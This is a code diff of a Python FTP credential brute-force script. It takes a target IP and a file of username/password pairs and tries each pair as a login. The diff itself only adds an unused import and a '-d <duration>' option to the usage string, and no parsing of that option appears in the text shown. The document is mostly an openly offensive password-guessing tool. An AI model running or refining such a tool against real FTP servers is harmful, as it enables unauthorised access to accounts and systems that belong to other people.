@@ -2,6 +2,8 @@
 
 from ftplib import FTP
 from optparse import OptionParser
+import os, sys
+
 
 def brute(host, username, password):
     try:
@@ -14,7 +16,7 @@ def brute(host, username, password):
         print ('Could not connect to the ftp server using the provided username "' + username + '" and password "' + password + '"')
 
 def main():
-    parser = OptionParser(usage="usage: python3 <program name>.py -t <target IP> -p <password file>")
+    parser = OptionParser(usage="usage: python3 <program name>.py -t <target IP> -p <password file> -d <duration>")
     parser.add_option("-t", type="string",
                       help="Enter target host IP",
                       dest="targetHost")
@@ -31,5 +33,6 @@ def main():
 
         for username, password in data:
             brute(options.targetHost, username, password)
+
 
 main()
